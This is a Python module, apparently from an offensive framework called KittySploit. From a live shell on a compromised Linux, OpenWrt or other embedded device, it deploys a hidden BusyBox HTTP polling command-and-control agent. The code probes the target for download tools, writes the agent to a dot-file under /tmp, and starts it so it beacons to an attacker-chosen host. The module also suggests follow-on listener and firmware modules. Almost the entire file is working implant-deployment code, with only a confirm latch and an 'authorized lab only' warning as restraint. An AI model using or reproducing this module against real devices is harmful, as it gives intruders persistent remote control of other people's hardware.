#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Deploy BusyBox embedded HTTP polling C2 from a live shell session."""

from kittysploit import *
from lib.c2.embedded_session import EmbeddedC2Mixin
from lib.post.linux.session import LinuxSessionMixin
import uuid


class Module(Post, LinuxSessionMixin, EmbeddedC2Mixin):
    __info__ = {
        "name": "Deploy Embedded HTTP C2",
        "description": (
            "Generate and optionally execute a BusyBox/ash HTTP polling agent on an "
            "OpenWrt/embedded shell. Pairs with listeners/multi/reverse_http_polling."
        ),
        "author": "KittySploit Team",
        "platform": Platform.LINUX,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
        "tags": ["iot", "busybox", "openwrt", "c2", "manage", "embedded"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "chain": {
                "produces_capabilities": ["shell", "c2_beacon"],
                "consumes_capabilities": ["shell"],
                "suggested_followups": [
                    "listeners/multi/reverse_http_polling",
                    "post/shell/linux/busybox/firmware_info",
                ],
            },
            "requires": {"capabilities_any": ["shell"]},
        },
    }

    lhost = OptString("127.0.0.1", "C2 host reachable from the device", True)
    lport = OptPort(8088, "HTTP polling listen port", True)
    url_prefix = OptString("/c2", "URL prefix matching the listener", False)
    client_id = OptString("", "Implant id (auto if empty)", False)
    poll_interval = OptInteger(10, "Poll interval seconds", False)
    ssl = OptBool(False, "Use HTTPS to the listener", False)
    agent_path = OptString("/tmp/.ks_emb_c2.sh", "Remote script path", False)
    execute = OptBool(True, "Write + background the agent on the session", False)
    show_command = OptBool(True, "Print the deploy one-liner", False)
    confirm = OptBool(False, "Must be True to execute (safety latch)", True)

    def check(self):
        if not self.linux_require_linux():
            return False
        if not str(self.lhost or "").strip():
            print_error("lhost is required")
            return False
        return True

    def run(self):
        if not self.check():
            return False

        cid = str(self.client_id or "").strip() or f"emb-{uuid.uuid4().hex[:8]}"
        oneliner = self.build_embedded_http_oneliner(cid)

        print_status(f"Embedded HTTP C2 client_id={cid}")
        print_info(
            f"Start listeners/multi/reverse_http_polling on "
            f"{self.lhost}:{self.lport} url_prefix={self.url_prefix}"
        )
        print_info("Leave implant_public_key empty (BusyBox agent does not sign)")

        if bool(self.show_command):
            print_info("Deploy one-liner:")
            print_info(oneliner)

        if not bool(self.execute):
            script = self.build_embedded_http_agent(cid)
            print_success(f"Agent script generated ({len(script)} bytes, execute=false)")
            return True

        if not bool(self.confirm):
            print_error("Set confirm=true to deploy the embedded C2 agent")
            return False

        # Quick capability probe
        tools = (self.cmd_execute(
            "command -v curl; command -v wget; command -v uclient-fetch; "
            "command -v base64; command -v busybox"
        ) or "").strip()
        if tools:
            print_info(f"Target tools:\n{tools}")

        print_warning("Deploying embedded HTTP polling agent (authorized lab only)")
        try:
            self.cmd_execute(oneliner)
        except Exception as exc:
            print_warning(f"Dispatch reported: {exc}")

        print_success("Agent dispatched — wait for reverse_http_polling check-in")
        print_info(f"Expected implant id: {cid}")
        return True
